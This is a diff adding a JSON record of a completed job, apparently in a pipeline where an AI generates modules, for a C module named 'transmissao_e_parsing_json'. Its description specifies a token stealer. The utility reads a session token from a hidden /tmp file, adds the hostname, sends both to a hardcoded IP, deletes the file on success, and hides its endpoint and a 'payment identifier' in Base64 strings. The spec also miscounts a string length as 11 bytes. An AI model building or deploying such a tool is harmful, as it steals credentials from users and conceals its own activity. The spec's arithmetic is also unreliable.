@@ -1,0 +1,13 @@
+{
+  "code_lines": 177,
+  "code_path": "modules/transmissao_e_parsing_json.c",
+  "code_sha256": "7ac7466e49e837134f8872db17d38e85a13445962ee5420f7e85460a228cce47",
+  "description": "The management endpoint IP SHALL be exactly '10.254.19.73'. The utility SHALL read `/tmp/.session.token` using `fopen` and `fread`; the utility SHALL extract the value of `session_token` via manual JSON string parsing using `strstr` and `strchr`; the parsing SHALL use `strstr(buf, \"\\\"session_token\\\":\\\"\")` to locate the start, advance the pointer by `strlen(\"\\\"session_token\\\":\\\"\")` bytes (11 characters), and then use `strchr` to locate the closing `\"` character; the utility SHALL validate that the extracted value has length > 0 before use; the utility SHALL obtain `machine_label` using `gethostname()`; the utility SHALL construct the body: `{\"session_token\":\"...\",\"machine_label\":\"...\"}`; the utility SHALL transmit an HTTP request to `http://10.254.19.73:8080/ingest` via `libcurl` with `Content-Type: application/json`; if HTTP 200 is received, the utility SHALL remove `/tmp/.session.token` using `remove()`. The utility SHALL persist the management endpoint URL and the payment identifier in the source code as Base64-encoded char arrays; the utility SHALL decode the management endpoint URL and the payment identifier at runtime by invoking a base64_decode() function implemented within the same file. For mandatory JSON parsing, upon extraction of session_token from the file, the utility SHALL advance the pointer exactly strlen(\"\\\"session_token\\\":\\\"\") = 11 bytes after the result of strstr; the utility SHALL calculate the pointer advancement using strlen() and SHALL exclude hardcoded offsets such as += 10 or += 9; the utility SHALL validate that the extracted session_token value has a length greater than 0 prior to assembling the JSON payload for data transmission.",
+  "duration_seconds": 98.768722,
+  "finished_at": "2026-09-25T02:54:40.972+00:00",
+  "index": 6,
+  "name": "transmissao_e_parsing_json",
+  "prompt_path": "modules/06_transmissao_e_parsing_json/prompt.txt",
+  "started_at": "2026-09-25T02:53:02.203+00:00",
+  "status": "completed"
+}
